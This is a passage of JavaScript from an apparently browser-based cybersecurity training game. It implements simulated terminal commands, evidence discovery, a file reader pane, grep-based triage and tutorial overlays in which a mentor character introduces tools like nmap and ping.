  runCommandEntry(c);
}

/* Run one mission command: print its output, surface evidence on first run,
 * then the presentation-only learning loop. Mirrors Mission 1's first-read gate
 * so re-running a command never double-counts evidence or confidence. */
function runCommandEntry(c) {
  const firstRun = !SIM.ranCommands.has(c.id);
  SIM.ranCommands.add(c.id);

  (c.output || []).forEach(line => {
    if (typeof line === 'string') simPrint('  ' + line, 'file');
    else simPrint(line.t, line.c || 'file');
  });

  const evBefore = SIM.evidence.size;
  if (firstRun) (c.reveals || []).forEach(surfaceEvidence);
  const evSurfaced = SIM.evidence.size - evBefore;

  if (c.observation) simPrint('▸ ' + c.observation, 'observe');
  if (c.question)    simPrint('? ' + c.question, 'question');
  if (firstRun && (c.reveals || []).length) {
    simPrint('  confidence ↑ — now ' + investigationConfidence() + '%', 'confidence');
  }
  if (c.next) simPrint('→ Next: ' + c.next, 'next');
  if (evSurfaced > 0) simNotebookCue(evSurfaced);
  simPrint('', 'spacer');

  // Active Investigation Feed (Task #154) — neutral command record; never interprets.
  if (firstRun) emitFeed('command', 'Ran ' + ((c.match && c.match[0]) || c.id) + '.');
  if (evSurfaced > 0) emitFeed('finding', 'New finding added to your notebook.');
  renderEvidencePanel();

  if (firstRun && coreCommandsRun() && SIM.stage === 'investigation') {
    simPrint('You have gathered the core evidence. Make your determination in the notebook, then type  decide  to choose a response.', 'ok');
    simRevealActions(false);
  }
}

/* True once every command flagged `core: true` has been run. Gates the "decide"
 * nudge and the thoroughness bonus for command-model missions. */
function coreCommandsRun() {
  const core = ((SIM.def && SIM.def.commands) || []).filter(c => c.core);
  if (!core.length) return false;
  return core.every(c => SIM.ranCommands.has(c.id));
}

/* Mission-agnostic "did the analyst finish the investigation?": every file-borne
 * finding surfaced for file-model missions (via cat OR grep), all core commands
 * run for command-model missions. Evidence-based (not all-files-read) so the
 * grep-triage flow earns the same completion + thoroughness bonus. */
function investigationComplete() {
  return simFiles().length ? allFileEvidenceSurfaced() : coreCommandsRun();
}

/* The single identification (which device / which account) for command-model
 * missions. Single-select; feeds the recommendation outcome like classification
 * does for Mission 1. */
function setIdentification(id) {
  const idf = SIM.def && SIM.def.identify;
  if (!idf) return;
  if (!(idf.options || []).some(o => o.id === id)) return;
  SIM.identified = id;
  renderEvidencePanel();
  if (SIM.mapOpen) renderSimMap();   // keep the interactive map flag in sync
}

function identificationQuality() {
  const idf = SIM.def && SIM.def.identify;
  if (!idf) return 0;
  return SIM.identified === idf.correctId ? 1 : 0;
}

function simCmdLs() {
  SIM.listed = true;
  const files = simFiles();
  if (!files.length) { simPrint('release/ is empty.', 'dim'); return; }
  simPrint(`release/  —  ${files.length} files queued for external release`, 'head');
  files.forEach(f => {
    let tag = '';
    if (SIM.read.has(f.name)) tag = '   ✓ reviewed';
    else if ((f.evidenceIds || []).some(id => SIM.evidence.has(id))) tag = '   ● flagged';
    simPrint(`  ${f.name}${tag}`, 'file');
  });
  const grepReady = grepTriageEnabled() && fileModelGrepUnlocked();
  if (grepReady) {
    simPrint('Deep-read with  cat <file>  — or  grep <marker>  to scan the whole folder for sensitive data.', 'dim');
  } else {
    simPrint('Read a file with  cat <file>  to assess its sensitivity.', 'dim');
  }
  // Click-to-play affordances (B): each file/marker is a button that runs the
  // command through simRunCommand. Presentation-only — no scoring, same guards.
  simPrintCmdChips('Open:', files.map(f => ({ label: f.name, cmd: 'cat ' + f.name, done: SIM.read.has(f.name) })));
  if (grepReady) {
    const sugg = (SIM.def && Array.isArray(SIM.def.grepSuggestions)) ? SIM.def.grepSuggestions : [];
    if (sugg.length) simPrintCmdChips('Scan:', sugg.map(t => ({ label: 'grep ' + t, cmd: 'grep ' + t })));
  }
  renderSimHud();
}

/* `ls` / `pwd` are universal navigation helpers — non-scoring: they never surface
 * evidence or count as a command run. File-model missions keep the original
 * release-folder listing; command-model missions list the files their commands read. */
function simCmdList() {
  const def = SIM.def;
  if (def && Array.isArray(def.commands) && def.commands.length) return simCmdLsCommands();
  return simCmdLs();
}

/* Derive the readable filenames a command-model mission references from the
 * file-like tokens in its command aliases (e.g. `cat auth.log` -> auth.log).
 * Tokens like 192.168.1.57 or 192.168.1.0/24 are excluded (no alpha extension). */
function missionCommandFiles() {
  const cmds = (SIM.def && SIM.def.commands) || [];
  const seen = new Set();
  const files = [];
  cmds.forEach(c => (c.match || []).forEach(alias => {
    String(alias).split(/\s+/).forEach(tok => {
      if (/^[\w./-]+\.[a-z]{2,4}$/i.test(tok) && !seen.has(tok)) {
        seen.add(tok);
        files.push(tok);
      }
    });
  }));
  return files;
}

function simCmdLsCommands() {
  const files = missionCommandFiles();
  if (!files.length) {
    simPrint('No readable files here — this mission works through live tools.', 'dim');
    simPrint('Type  help  to see the available commands.', 'dim');
    return;
  }
  simPrint(`${files.length} file${files.length === 1 ? '' : 's'} in this directory:`, 'head');
  files.forEach(f => simPrint('  ' + f, 'file'));
  simPrint('Read one with  cat <file>  — or type  help  for the full command list.', 'dim');
}

/* Print the working directory taken from the mission's prompt label. */
function simCmdPwd() {
  const label = (SIM.def && SIM.def.promptLabel) || 'intern@cybercorp:~/release$';
  let path = label.slice(label.lastIndexOf(':') + 1).replace(/\$\s*$/, '').trim();
  if (!path) path = '~';
  simPrint(path.replace(/^~/, '/home/intern'), 'file');
}

/* On-demand File Reader (Task #153) — presentation-only. Mirrors the file the
 * analyst just opened into a pinned, scrollable pane beside the terminal so
 * short-line file content is easy to read without scrolling terminal history.
 * Transient (SIM.activeFile); never persisted, never graded. The terminal still
 * prints the file (mark-up / grep depend on those line records) — this is an
 * additive read surface, not a replacement. */
function renderFileReader() {
  const panel = document.getElementById('simFileReader');
  if (!panel) return;
  const file = SIM.activeFile ? simFileByName(SIM.activeFile) : null;
  if (!file) { panel.hidden = true; return; }
  const nameEl = document.getElementById('simFileReaderName');
  const body = document.getElementById('simFileReaderBody');
  if (nameEl) nameEl.textContent = file.name;
  if (body) {
    body.innerHTML = '';
    // Investigation Focus (Task #154) — an attention cue for what to look at in
    // this file. Authored per-file (def.files[].focus) with a generic fallback;
    // it never names the suspicious line or says whether the file is safe. Optional
    // focusTerms render as hover-definition glossary chips. Presentation-only.
    const focusText = (file.focus && String(file.focus).trim()) ||
      'Review this evidence carefully before making your decision.';
    const focusEl = document.createElement('div');
    focusEl.className = 'sim-file-focus';
    focusEl.innerHTML =
      `<span class="sim-file-focus-label">Investigation Focus</span>` +
      `<span class="sim-file-focus-text">${mapEsc(focusText)}</span>` +
      focusTermsHtml(file.focusTerms);
    body.appendChild(focusEl);
    (file.content || []).forEach(l => {
      const text = l == null ? '' : String(l);
      const div = document.createElement('div');
      div.className = 'sim-file-reader-line' + (text.trim() ? '' : ' sim-file-reader-line--blank');
      div.textContent = text;
      body.appendChild(div);
    });
    body.scrollTop = 0;
  }
  panel.hidden = false;
}

/* Close the File Reader pane (✕ button) — clears the transient open-file state. */
function closeFileReader() {
  SIM.activeFile = null;
  renderFileReader();
}

function simCmdRead(arg, mode) {
  if (!arg) { simPrint(`usage: ${mode} <file>`, 'err'); return; }
  const file = simFileByName(arg);
  if (!file) { simPrint(`${mode}: ${arg}: No such file. Run  ls  to see the folder.`, 'err'); return; }
  const firstRead = !SIM.read.has(file.name);
  SIM.read.add(file.name);
  simPrint(`── ${file.name} ──────────────────────────`, 'head');
  if (markupEnabled()) {
    (file.content || []).forEach((l, i) => simPrintFileLine(file.name, i, l));
  } else {
    (file.content || []).forEach(l => simPrint('  ' + l, 'file'));
  }
  simPrint('', 'spacer');
  const evBefore = SIM.evidence.size;
  if (firstRead) (file.evidenceIds || []).forEach(surfaceEvidence);
  const evSurfaced = SIM.evidence.size - evBefore;
  if (evSurfaced > 0) simNotebookCue(evSurfaced);
  // Active Investigation Feed (Task #154) — neutral record; never interprets.
  if (firstRead) emitFeed('review', 'Reviewed ' + file.name + '.');
  if (evSurfaced > 0) emitFeed('finding', 'New finding added to your notebook.');
  renderEvidencePanel();
  // Pin the opened file into the on-demand File Reader (Task #153) — additive,
  // presentation-only; the terminal lines above remain the mark-up/grep surface.
  SIM.activeFile = file.name;
  renderFileReader();
  const grepNudgedBefore = SIM.grepUnlockNudged;
  maybeUnlockGrepTriage(firstRead);
  maybeNudgeInvestigationReady();
  // Live "→ Next:" guidance (A). Skip on the exact frame the grep-unlock coaching
  // fires now (it owns that beat); deferred grep nudges are handled by
  // maybePrintNextStep's own grepNudgePending guard.
  const grepJustPrinted = !grepNudgedBefore && SIM.grepUnlockNudged && !SIM.grepNudgePending;
  if (!grepJustPrinted) maybePrintNextStep();
}

/* ------------------------------------------------------------------ *
 * grep — the THIRD investigative skill for file-model missions (Mission 1),
 * beside `ls` (enumerate) and `cat` (deep-read). The analyst hunts the whole
 * folder for a sensitivity marker instead of opening every file blind, learning
 * to find signal. Literal, case-insensitive substring search — no regex.
 *
 * Printing matches is pure presentation (real grep shows matching lines, any
 * term). EVIDENCE is surfaced only when the searched term is an AUTHORED
 * indicator for a matched file (file.grepTerms) — through the SAME idempotent
 * surfaceEvidence() chokepoint as cat, so there is no new graded path and no
 * double-count. Soft-gated behind two deep reads (fading scaffolding).
 * ------------------------------------------------------------------ */
function grepTriageEnabled() { return !!(SIM.def && SIM.def.grepTriage); }
function fileModelGrepUnlocked() { return SIM.read.size >= 2; }

/* Fading scaffolding: once the analyst has deep-read two files, unlock grep so
 * they triage instead of opening every file (earned autonomy). Marks grep as
 * "introduced" so later command-model missions don't re-brief it. */
function maybeUnlockGrepTriage(firstRead) {
  if (!firstRead || !grepTriageEnabled() || SIM.grepUnlockNudged) return;
  if (SIM.read.size < 2) return;
  SIM.grepUnlockNudged = true;
  if (typeof markCommandBriefSeen === 'function') markCommandBriefSeen('grep');
  // Surface the "you can grep now" coaching only when the command line is actually
  // free to use it. The second read often surfaces a finding that locks the
  // terminal for Sarah's judgment — defer the nudge until the dock clears
  // (flushed by updateDecisionLock) so it never tells the player to type while
  // the input is disabled.
  if (decisionLocked()) { SIM.grepNudgePending = true; return; }
  printGrepUnlockNudge();
}
/* The grep-unlock coaching, printed at the moment the terminal is usable. */
function printGrepUnlockNudge() {
  SIM.grepNudgePending = false;
  simPrint('', 'spacer');
  simPrint('◆ SARAH REYES: Good — you have the lay of the land. You do not have to open every file blind.', 'cue');
  simPrint('  Use  grep <marker>  to scan the whole folder at once. Try  grep restricted ,  grep confidential , or  grep ext-contractor-07 .', 'cue-next');
}

/* Fire the "investigation complete" nudge once, when every file-borne finding
 * has surfaced (by cat OR grep). Shared by simCmdRead and simCmdGrep. */
function maybeNudgeInvestigationReady() {
  if (SIM.stage !== 'investigation' || SIM.investigationReadyNudged) return;
  if (!investigationComplete()) return;
  // If the finding that completed the investigation ALSO locked the Decision Dock,
  // don't tell the player to type `decide` while the command line is disabled.
  // Latch the nudge and flush it from updateDecisionLock() once Sarah's call is
  // answered — so the completion handoff lands on an action they can take.
  if (decisionLocked()) { SIM.completionNudgePending = true; return; }
  SIM.investigationReadyNudged = true;
  simPrint('All findings are in. Classify what you found in the notebook, then type  decide  to choose a handling action.', 'ok');
  simRevealActions(false);
}

function simCmdGrep(arg) {
  const raw = String(arg || '').trim();
  if (!raw) { simPrint('usage: grep <text>   (e.g. grep restricted, grep ext-contractor-07)', 'err'); return; }
  // Fading scaffolding — get the lay of the land before triaging.
  if (grepTriageEnabled() && !fileModelGrepUnlocked()) {
    simPrint('grep is for triaging once you know the folder. Read a file or two first with  cat <file>  — then search for what stands out.', 'dim');
    return;
  }
  // Accept `grep <term> <file>` (scoped) or `grep <term>` (whole folder).
  const parts = raw.split(/\s+/);
  let scopeFile = null;
  let term = raw;
  if (parts.length > 1) {
    const maybe = simFileByName(parts[parts.length - 1]);
    if (maybe) { scopeFile = maybe; term = parts.slice(0, -1).join(' '); }
  }
  const needle = term.toLowerCase();
  const files = scopeFile ? [scopeFile] : simFiles();
  // Literal matches (presentation — what real grep would print).
  const hits = [];
  files.forEach(f => (f.content || []).forEach(line => {
    if (String(line).toLowerCase().includes(needle)) hits.push({ file: f, line });
  }));
  simPrint(`$ grep "${term}"${scopeFile ? ' ' + scopeFile.name : ' release/*'}`, 'head');
  if (!hits.length) {
    simPrint('  no matches. Try a sensitivity marker — e.g. restricted, confidential, pci, ext-contractor-07.', 'dim');
    return;
  }
  const MAX = 12;
  hits.slice(0, MAX).forEach(h => simPrint(`  ${h.file.name}:  ${String(h.line).trim()}`, 'file'));
  if (hits.length > MAX) simPrint(`  …and ${hits.length - MAX} more line${hits.length - MAX === 1 ? '' : 's'}.`, 'dim');
  simPrint('', 'spacer');
  // Surface evidence ONLY where the searched term CONTAINS an authored indicator
  // for a matched file (file.grepTerms). Containment (not bidirectional substring)
  // keeps it precise: `grep public` surfaces the public datasheet but NOT the
  // roadmap marked "non-public". Print first, THEN surface, so any concept-card /
  // map auto-open overlay opens after the grep output is already on screen.
  const matched = new Set(hits.map(h => h.file));
  const newly = [];
  if (needle.length >= 3) {
    files.forEach(f => {
      if (!matched.has(f)) return;
      const terms = (f.grepTerms || []).map(t => String(t).toLowerCase());
      if (!terms.some(t => needle.includes(t))) return;
      (f.evidenceIds || []).forEach(id => {
        if (!SIM.evidence.has(id)) { surfaceEvidence(id); newly.push(id); }
      });
    });
  }
  if (newly.length > 0) simNotebookCue(newly.length);
  // Active Investigation Feed (Task #154) — the player's own search term is safe.
  emitFeed('scan', 'Scanned the files for "' + term + '".');
  if (newly.length > 0) emitFeed('finding', 'New finding added to your notebook.');
  renderEvidencePanel();
  // Contractor "aha" — name the cross-file correlation and point to the deep read.
  if (newly.includes('ev_contractor_access')) {
    simPrint('◆ Correlation: the SAME vendor account that packed this release also read HR/Finance files at 02:00. Read the full trail with  cat access_log.txt  before you log your call.', 'cue');
  }
  maybeNudgeInvestigationReady();
  maybePrintNextStep(); // Live "→ Next:" guidance (A) — no-op while locked/complete.
}

/* Surface one evidence item: add to the set, log it, and raise any discovery
 * flag it carries (e.g. discovering the contractor access). */
function surfaceEvidence(evId) {
  if (SIM.evidence.has(evId)) return;
  const e = evidenceById(evId);
  if (!e) return;
  SIM.evidence.add(evId);
  SIM.lastEvidenceId = evId; // newest finding for the Active Investigation Feed.
  simPrint('● EVIDENCE: ' + e.label, 'evidence');
  if (e.setFlag) setMissionFlag(e.setFlag, true);
  // Reactive map: refresh the button count, and live-update the overlay if open.
  // Presentation-only — reads SIM.evidence, writes nothing.
  if (missionHasMap()) {
    updateMapButton();
    if (SIM.mapOpen) renderSimMap();
  }
  // A just-in-time concept card fires first; if it claims this reveal, defer the
  // map auto-open so two body-level overlays never stack. Triggers are authored
  // disjoint from boardMilestones, so in practice only one of these ever fires.
  if (!maybeShowConceptCard(evId)) maybeAutoOpenSimMap(evId);
}

/* Smoothly bring an element into view WITHIN the notebook scroll container (never
 * scrolls the whole page). Presentation-only. */
function simScrollBodyTo(body, el) {
  if (!body || !el) return;
  const bRect = body.getBoundingClientRect();
  const eRect = el.getBoundingClientRect();
  const delta = (eRect.top - bRect.top) - 12;
  if (Math.abs(delta) < 2) return;
  const reduce = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
  try { body.scrollTo({ top: body.scrollTop + delta, behavior: reduce ? 'auto' : 'smooth' }); }
  catch (_) { body.scrollTop += delta; }
}

/* Terminal → Notebook bridge. The player's attention is in the terminal; after a
 * command surfaces new evidence, name the Analyst Notebook explicitly and state
 * the next action so the silent panel update never goes unnoticed.
 * Presentation-only: prints terminal lines, writes nothing. Gated on
 * caseFileNotebook so it only speaks for missions that use the case file. */
function simNotebookCue(n) {
  if (!SIM.def || !SIM.def.caseFileNotebook) return;
  if (!n || n < 1) return;
  simPrint(`◆ ${n} new finding${n === 1 ? '' : 's'} logged to your ANALYST NOTEBOOK (right panel).`, 'cue');
  // The "what stands out / why it matters" judgment now happens in the Decision
  // Dock, not the notebook. While a dock call is pending, don't also point the
  // player at the notebook for it — that contradicts the dock and the objective
  // HUD. The other next-steps (investigate / classify / decide) are still valid
  // terminal guidance, so keep printing those.
  if (!caseFileDecisionPending()) {
    const next = caseFileNextStep();
    if (next) simPrint(`  In the notebook → ${next}`, 'cue-next');
  }
}

/* Investigation-First (Mission 1): auto-open the investigation board the first
 * time a milestone discovery surfaces, so the player SEES the picture build up.
 * Strictly gated on def.boardMilestones (absent on M2-M4 → never fires), fires
 * once per milestone (autoOpenedBoardEvents), and never steals an already-open
 * or manually-closed-this-frame map. Reuses the existing overlay; no scoring. */
function maybeAutoOpenSimMap(evId) {
  const milestones = (SIM.def && SIM.def.boardMilestones) || null;
  if (!milestones || !milestones.includes(evId)) return;
  if (!missionHasMap()) return;
  if (SIM.autoOpenedBoardEvents.has(evId)) return;
  SIM.autoOpenedBoardEvents.add(evId);
  if (SIM.mapOpen) return; // already showing — the live render above covers it
  openSimMap();
}

/* ================================================================== *
 * JUST-IN-TIME CONCEPT CARDS (presentation-only)
 * ------------------------------------------------------------------ *
 * A one-time "new concept" overlay shown the first time a concept becomes
 * relevant (keyed to a finding via def.conceptCards[].triggerEv). Reuses
 * SIM_GLOSSARY copy via glossaryKey. Writes only SIM.conceptsSeen /
 * SIM.conceptOpen (transient, reset each mission). Never scores or persists.
 * Triggers are authored DISJOINT from def.boardMilestones, and surfaceEvidence
 * defers the map auto-open whenever a card claims the reveal, so the concept
 * overlay and the network-map overlay never stack. */
function conceptCardContent(card) {
  const g = card && card.glossaryKey ? glossaryEntry(card.glossaryKey) : null;
  return {
    term: (card && card.term) || (g && g.term) || 'New concept',
    definition: (card && card.definition) || (g && g.definition) || '',
    why: (card && card.why) || (g && g.why) || '',
    examples: Array.isArray(card && card.examples) ? card.examples : [],
  };
}

/* Show a concept card for this finding if one is configured and unseen. Returns
 * true when a card was shown (so the caller can defer the map auto-open). */
function maybeShowConceptCard(evId) {
  try {
    const cards = (SIM.def && SIM.def.conceptCards) || null;
    if (!cards) return false;
    if (SIM.mapOpen || SIM.conceptOpen) return false;   // never stack overlays
    const card = cards.find(c => c && c.triggerEv === evId);
    if (!card || !card.id) return false;
    if (SIM.conceptsSeen.has(card.id)) return false;
    SIM.conceptsSeen.add(card.id);
    openConceptCard(card);
    return true;
  } catch (_) { return false; }
}

let simConceptEl = null;
function simConceptEnsure() {
  if (simConceptEl) return simConceptEl;
  const ov = document.createElement('div');
  ov.className = 'sim-concept-overlay';
  ov.id = 'simConceptOverlay';
  ov.hidden = true;
  ov.innerHTML = `
    <div class="sim-concept-card" role="dialog" aria-modal="true" aria-labelledby="simConceptTerm">
      <div class="sim-concept-head">
        <span class="sim-concept-kicker">\u25C8 NEW CONCEPT</span>
        <button type="button" class="sim-concept-close" data-concept-close aria-label="Close concept card">\u2715</button>
      </div>
      <h3 class="sim-concept-term" id="simConceptTerm"></h3>
      <p class="sim-concept-def" id="simConceptDef"></p>
      <div class="sim-concept-why" id="simConceptWhyWrap">
        <span class="sim-concept-why-label">Why it matters</span>
        <span class="sim-concept-why-text" id="simConceptWhy"></span>
      </div>
      <ul class="sim-concept-examples" id="simConceptExamples"></ul>
      <div class="sim-concept-foot">
        <button type="button" class="sim-concept-gotit" data-concept-close>Got it \u2014 continue</button>
      </div>
    </div>`;
  ov.addEventListener('click', e => {
    if (e.target === ov || e.target.closest('[data-concept-close]')) closeConceptCard();
  });
  document.body.appendChild(ov);
  simConceptEl = ov;
  return ov;
}

function openConceptCard(card) {
  const ov = simConceptEnsure();
  const c = conceptCardContent(card);
  ov.querySelector('#simConceptTerm').textContent = c.term;
  ov.querySelector('#simConceptDef').textContent = c.definition;
  const whyWrap = ov.querySelector('#simConceptWhyWrap');
  if (c.why) { ov.querySelector('#simConceptWhy').textContent = c.why; whyWrap.hidden = false; }
  else whyWrap.hidden = true;
  const exHost = ov.querySelector('#simConceptExamples');
  exHost.innerHTML = c.examples.map(x => `<li>${mapEsc(x)}</li>`).join('');
  exHost.hidden = c.examples.length === 0;
  ov.hidden = false;
  SIM.conceptOpen = true;
  const gotit = ov.querySelector('.sim-concept-gotit');
  if (gotit) gotit.focus();
}

function closeConceptCard() {
  const wasOpen = SIM.conceptOpen;
  SIM.conceptOpen = false;
  if (simConceptEl) simConceptEl.hidden = true;
  if (wasOpen) {
    const input = document.getElementById('simTermInput');
    if (input) { try { input.focus(); } catch (_) { /* focus is best-effort */ } }
  }
}

/* ================================================================== *
 * COMMAND BRIEFS — "Guided Terminal" (presentation-only)
 * ------------------------------------------------------------------ *
 * The first time a player reaches for a brand-new tool, Sarah Reyes
 * steps in with a short brief — what the tool does and why she wants it
 * now — BEFORE the command runs. Teaching only: it never grades, scores,
 * blocks progression, or reveals a verdict (setDiscoveryJudgment stays
 * the sole graded write).
 *
 *  - Gated on def.commandBriefs (a mission flag), never a mission id.
 *  - Keyed by TOOL (the TYPED command's leading verb, looked up in
 *    CMD_BRIEF_LIBRARY), so a tool is briefed once EVER across missions
 *    and sessions via setMissionFlag('cmdBrief:'+toolKey). cmdBrief:* is
 *    outside CANON_FLAGS, so it never feeds carry-flag / dynamic logic.
 *  - Fades with rank: suppressed once the analyst outranks the early
 *    grades (a suppressed brief is NOT marked seen, so a junior re-run
 *    still teaches).
 *  - Sits BEHIND the Decision Dock: maybeShowCommandBrief runs only
 *    after the dock's hard-lock guard, so a brief never interrupts a
 *    pending call.
 *  - closeCommandBrief() is the SINGLE chokepoint: every dismissal path
 *    (Run it / ✕ / backdrop / Esc) runs the stashed command, so the
 *    player's typed command is never silently dropped.
 * ================================================================== */
const COMMAND_BRIEF_MAX_LEVEL = 2;   // brief Intern (1) & Junior (2); fade above

// Brief copy, keyed by the tool's leading verb. cat / ls / less are
// intentionally absent — they are introduced gently in Mission 1, so they
// are never "new" by the time a command-brief mission runs. Copy explains
// the TOOL and Sarah's reasoning; it never names the case's verdict.
const CMD_BRIEF_LIBRARY = {
  ip: {
    tool: 'ip addr',
    what: "Shows your own machine's address on the network — the number that identifies your workstation on the office LAN.",
    why: "Start by knowing where you stand. Once you know your own subnet, you know the neighbourhood every device shares with you — that's the ground we're about to search.",
  },
  nmap: {
    tool: 'nmap',
    what: "Scans a whole range of network addresses at once and reports which devices are switched on and answering.",
    why: "Before we can spot a device that shouldn't be here, we need the full list of what IS here. nmap draws that map in a single sweep.",
  },
  ping: {
    tool: 'ping',
    what: "Sends a quick 'are you there?' to a single address and times the reply — a fast way to confirm a host is real and reachable.",
    why: "A name in a scan isn't proof. Ping the host yourself — if it answers, you know there's a live machine on the other end, not a stale record.",
  },
  grep: {
    tool: 'grep',
    what: "Filters a file down to just the lines that match a word — instead of reading the whole thing, you see only what you searched for.",
    why: "These logs are long. grep is how an analyst cuts to the signal — pull just the failed logins, just the one account, and the pattern jumps out.",
  },
  tail: {
    tool: 'tail',
    what: "Shows the LAST lines of a file — the most recent entries — instead of printing the whole thing from the top.",
    why: "When something just happened, the newest events sit at the end. tail puts the latest activity in front of you without scrolling through history.",
  },
};

function commandBriefsEnabled() { return !!(SIM.def && SIM.def.commandBriefs); }
function commandBriefSeen(toolKey) {
  return !!(toolKey && CAREER.missionFlags && CAREER.missionFlags['cmdBrief:' + toolKey]);
}
function markCommandBriefSeen(toolKey) { if (toolKey) setMissionFlag('cmdBrief:' + toolKey, true); }
function commandBriefFadedByRank() {
  try { return activeRole().authorityLevel > COMMAND_BRIEF_MAX_LEVEL; } catch (_) { return false; }
}
// The tool the player is using = the leading verb of what they actually TYPED
// (e.g. 'ip addr' -> 'ip', 'nmap 192.168.1.0/24' -> 'nmap', 'grep failed' -> 'grep').
// Keying on the typed verb (not the command's canonical match[0]) means a brief
// always matches the tool the player reached for: typing `cat events.log` on a
// command whose primary alias is `tail events.log` shows NO brief (cat is old
// news from Mission 1), while typing `tail events.log` shows the tail brief.
function briefToolKey(typedCmd) {
  return normalizeCmd(typedCmd || '').split(' ')[0] || '';
}

/* Show the command brief for this command if its tool is new and unseen.
 * `typedCmd` is the raw command the player entered; its leading verb keys the
 * brief. Returns true when a brief was shown (so the caller defers the cmd). */
function maybeShowCommandBrief(c, typedCmd) {
  try {
    if (!commandBriefsEnabled()) return false;
    if (SIM.briefOpen || SIM.conceptOpen || SIM.mapOpen) return false;  // never stack overlays
    const toolKey = briefToolKey(typedCmd);
    const b = toolKey && CMD_BRIEF_LIBRARY[toolKey];
    if (!b) return false;                          // cat / ls / unknown verbs: no brief
    if (commandBriefFadedByRank()) return false;   // senior analysts skip the basics
    if (commandBriefSeen(toolKey)) return false;   // once ever per tool, across sessions
    openCommandBrief(toolKey, b, c);
    return true;
  } catch (_) { return false; }
}

let simBriefEl = null;
let simBriefPendingCmd = null;   // the command stashed to run when the brief closes
function simBriefEnsure() {
  if (simBriefEl) return simBriefEl;
  const ov = document.createElement('div');
  ov.className = 'sim-concept-overlay sim-brief-overlay';
  ov.id = 'simBriefOverlay';
  ov.hidden = true;
  ov.innerHTML = `
    <div class="sim-concept-card sim-brief-card" role="dialog" aria-modal="true" aria-labelledby="simBriefTool">
      <div class="sim-concept-head">
        <span class="sim-concept-kicker sim-brief-kicker">\u25C8 NEW TOOL \u00B7 SARAH REYES</span>
        <button type="button" class="sim-concept-close" data-brief-run aria-label="Close and run command">\u2715</button>
      </div>
      <h3 class="sim-concept-term sim-brief-tool" id="simBriefTool"></h3>
      <p class="sim-concept-def" id="simBriefWhat"></p>
      <div class="sim-concept-why sim-brief-why" id="simBriefWhyWrap">
        <span class="sim-concept-why-label">Why Sarah wants it now</span>
        <span class="sim-concept-why-text" id="simBriefWhy"></span>
      </div>
      <div class="sim-concept-foot">
        <button type="button" class="sim-concept-gotit sim-brief-run" data-brief-run>Run it \u2192</button>
      </div>
    </div>`;
  ov.addEventListener('click', e => {
    if (e.target === ov || (e.target.closest && e.target.closest('[data-brief-run]'))) closeCommandBrief();
  });
  document.body.appendChild(ov);
  simBriefEl = ov;
  return ov;
}

function openCommandBrief(toolKey, b, c) {
  const ov = simBriefEnsure();
  ov.querySelector('#simBriefTool').textContent = b.tool || toolKey;
  ov.querySelector('#simBriefWhat').textContent = b.what || '';
  const whyWrap = ov.querySelector('#simBriefWhyWrap');
  if (b.why) { ov.querySelector('#simBriefWhy').textContent = b.why; whyWrap.hidden = false; }
  else whyWrap.hidden = true;
  // Retire the brief the moment it is shown (once ever per tool) — every
  // dismissal path runs the command, so "shown" is the right commit point.
  markCommandBriefSeen(toolKey);
  simBriefPendingCmd = c;
  ov.hidden = false;
  SIM.briefOpen = true;
  const run = ov.querySelector('.sim-brief-run');
  if (run) { try { run.focus(); } catch (_) { /* focus is best-effort */ } }
}

/* SINGLE chokepoint for every dismissal: run the stashed command so the
 * typed command is never dropped, then return focus to the terminal unless
 * a follow-on overlay (concept card / network map) has taken over. */
function closeCommandBrief() {
  if (!SIM.briefOpen) return;
  SIM.briefOpen = false;
  if (simBriefEl) simBriefEl.hidden = true;
  const pending = simBriefPendingCmd;
  simBriefPendingCmd = null;
  if (pending) runCommandEntry(pending);
  if (!SIM.conceptOpen && !SIM.mapOpen) {
    const input = document.getElementById('simTermInput');
    if (input) { try { input.focus(); } catch (_) { /* focus is best-effort */ } }
  }
}

/* ------------------------------------------------------------------ *
 * (E) ONE-TIME MISSION ONBOARDING — a once-ever modal shown on first entry to a
 * file-model mission, teaching the investigate -> tell-Sarah -> decide loop.
 * Reuses the .sim-concept-overlay/.sim-concept-card shell. Persists ONLY a
 * once-ever UI flag (setMissionFlag('onboard:'+id)) — the same mechanism the
 * command briefs use — and otherwise writes nothing and scores nothing.
 * ------------------------------------------------------------------ */
let simOnboardEl = null;
function simOnboardEnsure() {
  if (simOnboardEl) return simOnboardEl;
  const ov = document.createElement('div');
  ov.className = 'sim-concept-overlay sim-onboard-overlay';
  ov.id = 'simOnboardOverlay';
  ov.hidden = true;
  ov.innerHTML = `
    <div class="sim-concept-card sim-onboard-card" role="dialog" aria-modal="true" aria-labelledby="simOnboardTitle">
      <div class="sim-concept-head">
        <span class="sim-concept-kicker sim-onboard-kicker">\u25C8 FIRST SHIFT \u00B7 SARAH REYES</span>
        <button type="button" class="sim-concept-close" data-onboard-close aria-label="Close onboarding">\u2715</button>
      </div>
      <h3 class="sim-concept-term sim-onboard-title" id="simOnboardTitle"></h3>
      <p class="sim-concept-def sim-onboard-intro" id="simOnboardIntro"></p>
      <ol class="sim-onboard-steps" id="simOnboardSteps"></ol>
      <div class="sim-concept-foot">
        <button type="button" class="sim-concept-gotit sim-onboard-cta" data-onboard-close id="simOnboardCta">Start \u2192</button>
      </div>
    </div>`;
  ov.addEventListener('click', e => {
    if (e.target === ov || (e.target.closest && e.target.closest('[data-onboard-close]'))) closeMissionOnboarding();
  });
  document.body.appendChild(ov);
  simOnboardEl = ov;
  return ov;
}

function onboardingSeen(missionId) {
  return !!(missionId && CAREER && CAREER.missionFlags && CAREER.missionFlags['onboard:' + missionId]);
}

/* Show the onboarding once, on first entry to a file-model mission that authors
 * an `onboarding` block. Gated on BOTH def.onboarding AND markupEnabled() so it
 * can never fire for a command-model mission. Best-effort — never blocks play. */
function maybeShowMissionOnboarding(missionId) {
  try {
    if (!markupEnabled()) return;
    const ob = SIM.def && SIM.def.onboarding;
    if (!ob) return;
    if (onboardingSeen(missionId)) return;
    if (SIM.briefOpen || SIM.conceptOpen || SIM.mapOpen) return; // never stack overlays
    showMissionOnboarding(ob);
    setMissionFlag('onboard:' + missionId, true); // once ever, like the command briefs
  } catch (_) { /* onboarding is best-effort */ }
}

function showMissionOnboarding(ob) {
  const ov = simOnboardEnsure();
  ov.querySelector('#simOnboardTitle').textContent = ob.title || 'How this works';
  ov.querySelector('#simOnboardIntro').textContent = ob.intro || '';
  const stepsEl = ov.querySelector('#simOnboardSteps');
  stepsEl.innerHTML = '';
  (ob.steps || []).forEach(s => {
    const li = document.createElement('li');
    li.className = 'sim-onboard-step';
    const h = document.createElement('span');
